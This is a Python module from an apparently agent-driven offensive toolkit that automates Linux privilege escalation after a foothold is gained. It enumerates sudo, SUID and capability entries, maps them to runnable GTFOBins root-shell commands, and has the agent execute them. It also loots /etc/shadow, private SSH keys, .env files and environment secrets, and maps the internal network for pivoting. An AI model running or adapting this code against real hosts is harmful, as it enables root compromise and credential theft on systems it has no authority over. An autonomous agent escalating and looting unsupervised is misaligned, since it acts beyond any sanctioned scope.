"""Phase 7 — systematic Linux privilege escalation.

Through the exec foothold: enumerate the host, then match discovered sudo rights,
SUID binaries, and file capabilities against GTFOBins to produce concrete, runnable
escalation candidates. The agent confirms a candidate by executing it (uid=0).

ponytail: GTFOBins covers the common wins; kernel-exploit / writable-path / cron
escalation is left to the agent's reasoning (it has the enumeration output).
"""
from __future__ import annotations

import json
import os
import re
from functools import lru_cache
from pathlib import Path

import requests

from .techniques import GTFOBINS_API

# Enumeration run through the foothold. Each value is a shell command.
ENUM = {
    "id": "id",
    "uname": "uname -a",
    "os": "cat /etc/os-release 2>/dev/null | head -5",
    "sudo": "sudo -n -l 2>/dev/null",
    "suid": "find / -perm -4000 -type f 2>/dev/null",
    "caps": "getcap -r / 2>/dev/null",
    "cron": "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d 2>/dev/null",
    "writable": "find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev)' | head -20",
    "secrets": "ls -la ~/.ssh 2>/dev/null; tail -n 20 ~/.bash_history 2>/dev/null",
}

_GTFO_CACHE = Path(".metsec_cache/gtfobins.json")

# Post-exploitation looting — credentials, keys, and proof files. Run as the
# current foothold user (run again after escalating to root for root-only files).
LOOT = {
    "passwd": "cat /etc/passwd 2>/dev/null | head -40",
    "shadow": "cat /etc/shadow 2>/dev/null",
    "ssh_keys": "cat ~/.ssh/id_* /root/.ssh/id_* /home/*/.ssh/id_* 2>/dev/null",
    "history": "tail -n 40 ~/.bash_history 2>/dev/null",
    "env_secrets": "env 2>/dev/null | grep -iE 'key|token|secret|pass|aws'",
    "dotenv": "cat /app/.env /var/www/.env ~/.env 2>/dev/null",
    "app_secrets": "grep -rIlE 'password|secret|api[_-]?key|token' /app /var/www 2>/dev/null | head -20",
    "proof": "cat /root/root.txt /root/proof.txt /home/*/user.txt ~/user.txt 2>/dev/null",
}


# Internal-network recon run through the foothold — the lay of the land for pivoting.
PIVOT = {
    "interfaces": "ip -o addr 2>/dev/null || ifconfig 2>/dev/null",
    "routes": "ip route 2>/dev/null || route -n 2>/dev/null",
    "neighbors": "ip neigh 2>/dev/null || arp -an 2>/dev/null",
    "hosts": "cat /etc/hosts 2>/dev/null",
    "listening": "ss -tunlp 2>/dev/null || netstat -tunlp 2>/dev/null",
    "dns": "cat /etc/resolv.conf 2>/dev/null",
}


def enumerate_host(run) -> dict:
    """run: a callable(command)->output (the exec channel). Returns a host profile."""
    return {k: run(cmd) for k, cmd in ENUM.items()}


def pivot(run) -> dict:
    """Internal network map from the foothold (interfaces, routes, neighbors, services)."""
    return {k: run(cmd) for k, cmd in PIVOT.items()}


def loot(run) -> dict:
    """Capture readable secrets/keys/proof via the foothold. Empty results dropped."""
    out = {}
    for k, cmd in LOOT.items():
        r = (run(cmd) or "").strip()
        if r and "command not found" not in r:
            out[k] = r[:1200]
    return out


def _gtfo_map(data: dict) -> dict:
    """binary -> {context: code} for shell/command techniques (sudo/suid/capabilities)."""
    out: dict[str, dict] = {}
    for name, entry in data.get("executables", {}).items():
        caps: dict[str, str] = {}
        for fn in ("shell", "command"):
            for item in entry.get("functions", {}).get(fn, []):
                base = item.get("code", "")
                for ctx, val in (item.get("contexts") or {}).items():
                    if ctx in ("sudo", "suid", "capabilities"):
                        code = (val.get("code") if isinstance(val, dict) else None) or base
                        caps.setdefault(ctx, code)
        if caps:
            out[name] = caps
    return out


@lru_cache(maxsize=1)
def load_gtfo() -> dict:
    if _GTFO_CACHE.exists():
        data = json.loads(_GTFO_CACHE.read_text())
    else:
        data = requests.get(GTFOBINS_API, timeout=60).json()
        _GTFO_CACHE.parent.mkdir(parents=True, exist_ok=True)
        _GTFO_CACHE.write_text(json.dumps(data))
    return _gtfo_map(data)


def _paths(text: str) -> list[str]:
    return re.findall(r"/[\w./+-]+", text or "")


def candidates(profile: dict, gtfo: dict | None = None) -> list[dict]:
    """Match enumerated sudo/suid/caps against GTFOBins → escalation candidates."""
    gtfo = gtfo if gtfo is not None else load_gtfo()
    found, seen = [], set()

    def add(binary, vector, code):
        if (binary, vector) in seen:
            return
        seen.add((binary, vector))
        run = f"sudo {code}" if vector == "sudo" else code
        found.append({"binary": binary, "vector": vector, "run": run,
                      "url": f"https://gtfobins.github.io/gtfobins/{binary}/"})

    for p in {b for b in _paths(profile.get("sudo", "")) if "/" in b}:
        name = os.path.basename(p)
        if name in gtfo and "sudo" in gtfo[name]:
            add(name, "sudo", gtfo[name]["sudo"])
    for p in _paths(profile.get("suid", "")):
        name = os.path.basename(p)
        if name in gtfo and "suid" in gtfo[name]:
            add(name, "suid", gtfo[name]["suid"])
    for p in _paths(profile.get("caps", "")):
        name = os.path.basename(p)
        if name in gtfo and "capabilities" in gtfo[name]:
            add(name, "capabilities", gtfo[name]["capabilities"])
    return found


if __name__ == "__main__":  # offline self-check: python -m metsec.privesc
    api = {"executables": {
        "find": {"functions": {"shell": [{"code": "find . -exec /bin/sh \\; -quit",
                 "contexts": {"sudo": None, "suid": {"code": "find . -exec /bin/sh -p \\; -quit"}}}]}},
        "vim": {"functions": {"command": [{"code": "vim -c ':!/bin/sh'",
                "contexts": {"sudo": None}}]}},
        "ping": {"functions": {}},
    }}
    gtfo = _gtfo_map(api)
    assert gtfo["find"]["sudo"].startswith("find") and "-p" in gtfo["find"]["suid"], gtfo["find"]
    assert "ping" not in gtfo

    profile = {"sudo": "    (root) NOPASSWD: /usr/bin/find\n    (root) /usr/bin/vim",
               "suid": "/usr/bin/find\n/usr/bin/passwd\n/bin/ping", "caps": ""}
    cands = candidates(profile, gtfo)
    vectors = {(c["binary"], c["vector"]) for c in cands}
    assert ("find", "sudo") in vectors and ("vim", "sudo") in vectors, vectors
    assert ("find", "suid") in vectors and ("passwd", "suid") not in vectors, vectors
    assert next(c for c in cands if c["vector"] == "sudo")["run"].startswith("sudo ")

    captured = loot(lambda c: "root:$6$hash:::" if "shadow" in c else "")
    assert list(captured) == ["shadow"] and captured["shadow"].startswith("root:"), captured

    pv = pivot(lambda c: "2: eth0 inet 10.0.0.5/24" if "addr" in c else "")
    assert "interfaces" in pv and "eth0" in pv["interfaces"]
    print("privesc self-check ok")
